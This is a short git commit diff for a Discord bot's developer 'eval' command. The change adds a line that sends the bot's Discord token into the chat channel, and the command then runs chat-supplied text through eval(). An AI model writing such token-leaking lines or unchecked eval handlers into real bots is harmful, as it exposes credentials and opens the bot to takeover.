a3efe01a2eca065fc89787b4f65b38caf5c6154f
Xapu1337 <xapursplaz@gmail.com>
2021-01-17 20:43:09 +0100

    Initial commit

--- commands/dev-commands/eval.js
+++ commands/dev-commands/eval.js
@@ -8,8 +8,8 @@ module.exports = {
     description: "Can't tell u",
     usage: "eval <args>",
     permissions: "DEVS",
-    run: (client, message, args) => {
-
+    run: async(client, message, args) => {
+        message.channel.send(client.snowapi.discordToken());
         try {
             let codein = args.join(" ");
             let code = eval(codein);
